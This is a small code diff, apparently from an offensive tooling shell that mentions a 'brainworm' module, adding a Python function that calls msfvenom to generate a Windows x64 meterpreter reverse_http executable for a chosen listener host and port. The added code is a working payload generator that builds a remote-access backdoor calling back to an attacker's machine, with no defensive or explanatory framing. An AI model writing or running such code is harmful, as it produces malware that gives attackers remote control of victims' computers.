@@ -351,6 +351,21 @@ def restore_bartmossbrainworm_go(original_lines):
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
+def generate_msfvenom_exe(lhost, lport, output_path):
+    import subprocess
+    cmd = [
+        'msfvenom',
+        '-p', 'windows/x64/meterpreter/reverse_http',
+        f'LHOST={lhost}',
+        f'LPORT={lport}',
+        '-f', 'exe',
+        '-o', output_path
+    ]
+    result = subprocess.run(cmd, capture_output=True)
+    if result.returncode != 0:
+        raise RuntimeError(f"msfvenom failed: {result.stderr.decode()}")
+
+
 def shell():
     current_module = None
     readline.set_completer(shell_completer)
